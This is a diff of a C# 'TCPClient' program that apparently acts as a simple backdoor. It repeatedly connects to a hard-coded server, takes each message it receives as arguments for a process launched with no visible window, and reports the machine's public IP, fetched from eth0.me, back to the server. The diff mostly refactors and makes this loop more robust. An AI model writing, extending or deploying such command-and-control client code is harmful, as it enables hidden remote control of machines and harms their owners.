@@ -12,31 +12,39 @@ namespace TCPClient
         static async Task Main(string[] args)
         {
             // Initialisation
-            string ip = await GetIp();
             bool finished = false;
 
             const int port = 13000;
-            const string serverIp = "10.5.48.44";
+            const string serverIp = "127.0.0.1";
+            string ip = await GetIp();
 
             // Get the IP adress and while the cliend hasn't been able to send bytes, continue
-            IPAddress server = IPAddress.Parse(serverIp);
             while (!finished)
-                finished = HandleTcp(server, port, ip);
+            {
+                finished = HandleTcp(serverIp, port, ip);
+                ip = await GetIp();
+            }
             Environment.Exit(0);
         }
 
-        /**
-         * Get the message, handle it and send the client IP
-         */
-        private static bool HandleTcp(IPAddress server, int port, string ip)
+        /// <summary>
+        /// Get the message, handle it and send the client IP to the servver
+        /// </summary>
+        /// <param name="serverIp">The IP of the server</param>
+        /// <param name="port">The port which is used to access the server</param>
+        /// <param name="ip">The IP of the client which has been collected with GetIp()</param>
+        /// <returns>A bool that is the succes of the handeling</returns>
+        private static bool HandleTcp(string serverIp, int port, string ip)
         {
             try
             {
                 // Initialisation
-                TcpClient client = new TcpClient(server.ToString(), port);
+                TcpClient client = new TcpClient(serverIp, port);
                 byte[] bytes = new byte[256];
 
                 NetworkStream stream = client.GetStream();
+                Console.WriteLine("\n Found server ! \n");
+
                 string message = string.Empty;
 
                 while (stream.Read(bytes, 0, bytes.Length) != 0)
@@ -48,18 +56,30 @@ namespace TCPClient
                     process.StartInfo.Arguments = message;
                     process.StartInfo.CreateNoWindow = true;
 
-                    byte[] response = System.Text.Encoding.ASCII.GetBytes(ip);
-                    stream.Write(response, 0, response.Length);
+                    if (ip != null)
+                    {
+                        byte[] response = System.Text.Encoding.ASCII.GetBytes(ip);
+                        stream.Write(response, 0, response.Length);
+                    }
+                    else
+                    {
+                        byte[] response = new byte[0];
+                        stream.Write(response, 0, response.Length);
+                    }
                 }
                 return true;
             }
             catch (Exception e)
             {
-                Console.Error.WriteLine(e.Message);
+                Console.Error.WriteLine(e.Message + Environment.NewLine);
                 return false;
             }
         }
 
+        /// <summary>
+        /// Get the public IP of the client by fetching eth0.me
+        /// </summary>
+        /// <returns>The client IP</returns>
         private static async Task<string> GetIp()
         {
             string ip = null;
@@ -73,11 +93,11 @@ namespace TCPClient
                 response.EnsureSuccessStatusCode();
                 ip = await response.Content.ReadAsStringAsync();
             }
-            catch(Exception e)
+            catch
             {
-                Console.Error.WriteLine("Error while fetching IP: " + e.Message);
+                Console.WriteLine("Wasn't able to get the client IP");
+                return "Nothing";
             }
-
             return ip;
         }
     }
